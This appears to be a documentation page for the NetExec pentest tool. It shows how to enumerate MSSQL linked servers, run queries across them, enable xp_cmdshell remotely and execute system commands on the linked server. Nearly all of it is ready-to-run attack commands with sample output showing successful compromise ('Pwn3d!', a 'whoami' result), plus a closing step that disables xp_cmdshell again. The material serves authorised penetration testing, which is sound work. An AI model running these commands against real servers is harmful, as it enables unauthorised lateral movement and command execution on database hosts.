---
description: Discover and execute MSSQL queries and system commands on linked MSSQL servers using NetExec
---

# MSSQL Linked Servers
MSSQL linked servers allow a database instance to establish a trusted connection to another database across domain or forest trusts, allowing users to query data and execute commands on remote databases.

## Find Linked Servers
The `enum_links` module queries the database to enumerate configured MSSQL linked servers.
```bash
nxc mssql <ip> -u user -p password -M enum_links   
MSSQL       <ip>      1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local) (EncryptionReq:False)
MSSQL       <ip>      1433   FQDN      [+] FQDN\user:password 
ENUM_LINKS  <ip>      1433   FQDN      [+] Linked servers found:
ENUM_LINKS  <ip>      1433   FQDN      [*]   - BRAAVOS
ENUM_LINKS  <ip>      1433   FQDN      [*]   - FQDN\SQLEXPRESS
```

## Execute MSSQL Queries on a Linked Server
Execute a MSSQL query specified in the COMMAND argument on the linked server specified in LINKED_SERVER.
```bash
nxc mssql <ip> -u user -p password -M exec_on_link -o LINKED_SERVER=BRAAVOS COMMAND='select @@servername'
MSSQL         <ip>      1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local) (EncryptionReq:False)
MSSQL         <ip>      1433   FQDN      [+] FQDN\user:pass (Pwn3d!)
EXEC_ON_LINK  <ip>      1433   FQDN      [*] Command output: [{'': 'BRAAVOS\\SQLEXPRESS'}]
```

## Enable xp_cmdshell on a Linked Server
Enable xp_cmdshell on the linked server to allow execution of system commands.
```bash
nxc mssql <ip> -u user -p password -M link_enable_cmdshell -o LINKED_SERVER=BRAAVOS ACTION=enable
MSSQL                 <ip>      1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local) (EncryptionReq:False)
MSSQL                 <ip>      1433   FQDN      [+] FQDN\user:password (Pwn3d!)
LINK_ENABLE_CMDSHELL  <ip>      1433   FQDN      [*] Enabling xp_cmdshell on BRAAVOS. Current value: False
LINK_ENABLE_CMDSHELL  <ip>      1433   FQDN      [+] xp_cmdshell enabled on BRAAVOS
```

## Command Execution on a Linked Server
Execute system commands on the linked server using xp_cmdshell.
```bash
nxc mssql <ip> -u user -p password -M link_xpcmd -o LINKED_SERVER=BRAAVOS CMD='whoami'           
MSSQL       <ip>      1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local) (EncryptionReq:False)
MSSQL       <ip>      1433   FQDN      [+] FQDN\user:password (Pwn3d!)
LINK_XPCMD  <ip>      1433   FQDN      [*] Running command on BRAAVOS: whoami
LINK_XPCMD  <ip>      1433   FQDN      [+] Executed command via linked server
LINK_XPCMD  <ip>      1433   FQDN      essos\sql_svc
```

## Don't forget to disable xp_cmdshell in production!
```bash
nxc mssql <ip> -u user -p password -M link_enable_cmdshell -o LINKED_SERVER=BRAAVOS ACTION=disable
MSSQL                 <ip>      1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local) (EncryptionReq:False)
MSSQL                 <ip>      1433   FQDN      [+] FQDN\user:password (Pwn3d!)
LINK_ENABLE_CMDSHELL  <ip>      1433   FQDN      [*] Disabling xp_cmdshell on BRAAVOS. Current value: True
LINK_ENABLE_CMDSHELL  <ip>      1433   FQDN      [+] xp_cmdshell disabled on BRAAVOS
```
